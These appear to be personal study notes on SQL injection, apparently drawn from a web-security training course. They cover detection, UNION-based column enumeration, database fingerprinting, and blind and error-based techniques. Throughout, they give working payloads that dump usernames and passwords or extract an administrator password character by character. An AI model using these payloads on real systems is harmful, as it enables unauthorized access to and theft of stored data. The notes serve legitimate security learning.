**SQL INJECTION**

---

Q. PRE_REQUISITE QUESTIONS : 

1. What is SQL? 
SQL is structured query language that is used for relational database management systems.

2. What is SQLi?
Structured Query Language Injection is a web vulnerability that allows an attacker to interfere, intercept
or modify query requests made by the application to the database.

---

__*FLOW OF SQLi*__

1. CHECK BY BREAKING SYNTAX USING SYMBOLS(',",'--,'#,-- etc)
2. CHECK IF IT IS AN INBAND SQL INJECTION. (Query results being visible in resonse html page)
3. IF PRESENT, WE HAVE TO KNOW NUMBER OF COLUMNS BEING RETURNED. THIS CAN BE FOUND BY TWO WAYS:
    a. ```' ORDER BY 1--``` : IF THE NUMBER OF COLUMN ISNT PRESENT IT WILL THROW ERROR.
    b. ``` ' UNION SELECT NULL,NULL-- ```: UNTIL THE NUMBER OF COLUMNS ARE EXACTLY EQUAL IT WILL ALWAYS THROW AN ERROR
4. AFTER FIGURING OUT NO OF COLUMNS NEXT STEP IS TO CHECK THE DATATYPE THAT BELONGS BY SUBSTITUING AND CHECKING.
eg : 


---

# Detecting SQL Injection Vulnerabilities

Manual detection involves testing each input field systematically:

- **Single Quote Test (`'`)**
  - Submit `'` and watch for errors or anomalies.
  - Errors suggest unsanitized input is being passed into SQL queries.

- **Echo / Base Value Tests**
  - Use SQL syntax that evaluates to the original value vs. a different value.
  - Compare responses for systematic differences.

- **Boolean Conditions**
  - Inject conditions like `OR 1=1` (true) and `OR 1=2` (false).
  - Different responses confirm injection.

- **Time‑Based Payloads**
  - Insert delays (e.g., `SLEEP(5)`).
  - Measure response time differences to detect blind injection.

- **Out‑of‑Band (OAST) Payloads**
  - Trigger external interactions (DNS/HTTP requests).
  - Monitor for resulting network activity as proof of query execution.
---

# SQL Injection in Different Query Parts

Most SQL injection vulnerabilities occur in the **WHERE clause of SELECT queries**.  
However, injection can happen in many other places:

- **UPDATE Statements**
  - Injection in updated values
    ```sql
    UPDATE users SET email = 'input_here' WHERE id = 1;
    ```
  - Injection in WHERE clause
    ```sql
    UPDATE users SET role = 'admin' WHERE username = 'input_here';
    ```

- **INSERT Statements**
  - Injection in inserted values
    ```sql
    INSERT INTO users (username, password) VALUES ('input_here', 'pass');
    ```

- **SELECT Statements**
  - Injection in table or column names
    ```sql
    SELECT input_here FROM users;
    ```
  - Injection in ORDER BY clause
    ```sql
    SELECT * FROM users ORDER BY input_here;
    ```

---
Lets assume this is the sql query.
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Then the payload to retrieve hidden data or unrealeased products. 
```
https://insecure-website.com/products?category=Gifts'--

OR

https://insecure-website.com/products?category=Gifts'+OR+1=1--
```
---
# Subverting Application Logic with SQL Injection

## Example: Login Authentication

Application checks credentials with:
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese';
```
---

# SQL Injection UNION Attacks

When an application is vulnerable to SQL injection and query results are reflected in responses, attackers can use the `UNION` keyword to retrieve data from other tables. This is known as a SQL injection UNION attack. The `UNION` keyword allows execution of one or more additional `SELECT` queries, appending their results to the original query.

Example:
```sql
SELECT a, b FROM table1
UNION
SELECT c, d FROM table2;
```

# SQL Injection UNION Attack Requirements

For a UNION query to work, two key requirements must be met:
1. The individual queries must return the **same number of columns**.
2. The **data types** in each column must be compatible.

To carry out a UNION attack, testers must:
- Identify how many columns are returned from the original query.
- Determine which columns are of a suitable data type to hold results from the injected query.

---

# Determining the Number of Columns in SQL Injection UNION Attacks

When performing a UNION attack, you must first determine how many columns are returned by the original query. Two common methods are used:

**Method 1: ORDER BY Testing**
- Inject a series of ORDER BY clauses, incrementing the column index:
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
- The database sorts results by the specified column index.  
- When the index exceeds the actual number of columns, an error occurs (e.g., `The ORDER BY position number 3 is out of range...`).  
- The last valid index = the number of columns in the query.  
- Even if the app hides detailed errors, differences in responses (error page, empty results) can still reveal the column count.

**Method 2: UNION SELECT with NULLs**
- Submit UNION payloads with increasing numbers of `NULL` values:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

- If the number of `NULL`s doesn’t match the column count, the database returns an error (e.g., `All queries combined using UNION must have equal number of expressions...`).  
- When the correct number of `NULL`s is used, the query succeeds and returns an extra row of `NULL`s.  
- `NULL` is used because it is compatible with most data types, maximizing success.  
- Depending on the application, you may see:
- An extra blank row in the output.
- A generic error or no visible change.
- In some cases, a runtime error (e.g., `NullPointerException`).

**Key Point:**  
Both methods help identify the correct column count. Once known, you can replace `NULL`s with actual values of compatible types to extract meaningful data.

---

# Database-Specific Syntax & Fingerprinting

## Mysql
- -- /* */ or use # for comments.
```
' UNION SELECT NULL--
```
Fingerprints:
- Supports LIMIT for row restriction.
- String concatenation via CONCAT().
- Verbose error messages often reveal schema info.
- Version info: SELECT version() or @@version;

## PostgreSQL
Comments: --, /* ... */ , (# doesnt work)
Fingerprints:
- Supports LIMIT like MySQL.
- String concatenation via || or string_agg().
- Time-based blind injection via pg_sleep().
- Version info: SELECT version();
- Current DB: SELECT current_database();

## Oracle
- Every `SELECT` must use `FROM` with a valid table.
- Built-in dummy table: `dual`.
  ```sql
  ' UNION SELECT NULL FROM dual--
  ```
Comments: -- (space is must for url --+), /* ... */
Fingerprints:
- Requires FROM dual for constant selects. eg : select null from dual; 
- String concatenation uses ||.
- Row limiting via ROWNUM.
- Version info: SELECT banner FROM v$version;

## SQL Server (Microsoft) very much similar to mysql.
Comments: --, /* ... */
Fingerprints:

- Uses TOP instead of LIMIT.
- String concatenation via +.
- Time-based blind injection via WAITFOR DELAY '0:0:5'.
- Version info: SELECT @@version;
- Current DB: SELECT DB_NAME();
---

# SQL Injection UNION Attack: Retrieving Interesting Data

Once you know the number of columns returned by the original query and which ones can hold string data, you can start retrieving useful information.

## Example: Extracting User Credentials
- Suppose the original query returns **two string columns**.
- Injection point is a quoted string in the `WHERE` clause.
- Database contains a table `users` with columns `username` and `password`.

Payload:
```sql
' UNION SELECT username, password FROM users--
```
---
## Retrieving Multiple Values in a Single Column
 - If the query only returns one column, you can concatenate multiple values.
- Use a separator to distinguish them.
- Oracle Example
```sql
' UNION SELECT username || '~' || password FROM users--
|| is Oracle’s string concatenation operator.

~ is used as a separator.
```
```
Result:

Code
administrator~s3cure
wiener~peter
carlos~montoya
```

Notes
Different databases use different concatenation syntax:
```
Oracle → ||
MySQL → CONCAT(username, '~', password)
PostgreSQL → username || '~' || password
SQL Server → username + '~' + password
```
---

# Listing the Contents of the Database

Most databases (except Oracle) provide metadata views called the **information schema**. 
These views let you examine the structure of the database, including tables and columns.

## Listing Tables
Query:
```sql
>>> SELECT * FROM information_schema.tables;

TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

## Listing Columns 

```sql
>>> SELECT * FROM information_schema.columns WHERE table_name = 'Users';

TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

Key Takeaway : 
- Use information_schema.tables to enumerate tables.
- Use information_schema.columns to enumerate columns and their types.

---
---

# Blind SQL Injection

## What is Blind SQL Injection?
- Occurs when an application is vulnerable to SQL injection but **does not return query results or database errors** in HTTP responses.
- Techniques like UNION attacks are ineffective because they rely on visible query output.
- Exploitation is still possible using indirect methods.

## Exploiting Blind SQL Injection via Conditional Responses
- Applications may behave differently depending on whether a query returns data.
- Example: Tracking cookies used in a query:
  ```sql
  SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4';

If the cookie matches → query returns data → response shows "Welcome back".
If not → query returns nothing → no message.
Payloads
```sql
...xyz' AND '1'='1; condition true → query returns rows → "Welcome back" displayed
...xyz' AND '1'='2; condition false → query returns nothing → no message.
```

---

# Blind SQL Injection: Extracting Data Character by Character

## Concept
- Blind SQL injection occurs when query results are not directly visible,
  but application behavior changes based on true/false conditions.
- Attackers can exploit this by probing one character at a time using conditional logic.

## Example: Extracting Administrator Password
Suppose there is a `Users` table with columns `Username` and `Password`.

### Step 1: Test First Character
```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm

#"Welcome back" → condition true → first character is greater than m.
```
or to exactly match : 
```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

---
---

# Error-Based SQL Injection

## Concept
- Error-based SQL injection occurs when attackers exploit **database error messages** to extract or infer sensitive data.
- Even in blind contexts, errors can reveal information:
  - Boolean conditions → trigger or suppress errors.
  - Verbose error messages → leak query results directly.

## Exploiting Conditional Errors
- Some applications do not change behavior based on query results.
- Instead, attackers can force the database to throw errors only if a condition is true.
- Differences in HTTP responses (error vs. normal) reveal the truth of injected conditions.

### Example Payloads
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a #error if true 
```

## extracting character by character
```sql
xyz' AND (SELECT CASE WHEN (Username='Administrator' AND SUBSTRING(Password,1,1)>'m') THEN 1/0 ELSE 'a' END FROM Users)='a
```

---

# Error-Based SQL Injection: Verbose Error Messages

## Concept
- Misconfigured databases sometimes return **verbose error messages**.
- These errors can reveal query structure or even leak sensitive data.
- This effectively turns blind SQL injection into visible exploitation.

## Example: Verbose Error Leak
Injecting a single quote into an `id` parameter:
```sql
SELECT * FROM tracking WHERE id = '''
```

Error :
```sql
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

## Using CAST() to Leak Data
- CAST() converts one datatype to another.
#### Forcing invalid conversions can trigger errors that expose data.
Example:
```sql
CAST((SELECT example_column FROM example_table) AS int)
```

Error : 
```sql
ERROR: invalid input syntax for type integer: "Example data"
```
The error message reveals the actual string value "Example data".
Useful when direct output is blocked or character limits prevent conditional probing.


example : 

```sql
xyz' AND (SELECT CASE WHEN (Username='Administrator' 
AND SUBSTRING(Password,1,1)>'m') 
THEN CAST('abc' AS INT) ELSE 'a' END FROM Users)='a failed conversion leaks.
```
